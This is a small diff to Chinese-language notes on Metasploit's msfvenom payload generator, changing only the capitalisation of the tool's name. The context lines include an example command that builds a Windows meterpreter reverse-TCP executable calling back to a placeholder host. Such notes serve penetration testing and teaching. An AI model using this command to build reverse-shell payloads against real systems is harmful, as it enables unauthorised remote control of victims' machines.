@@ -8,7 +8,7 @@
 ```
 
 ```
-MsfVenom 是一个 Metasploit 独立的 payload 生成器
+msfvenom 是一个 Metasploit 独立的 payload 生成器
 也可替代 msfpayload 和 msfencode
 Usage: /usr/bin/msfvenom [options] <var=val>
 Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
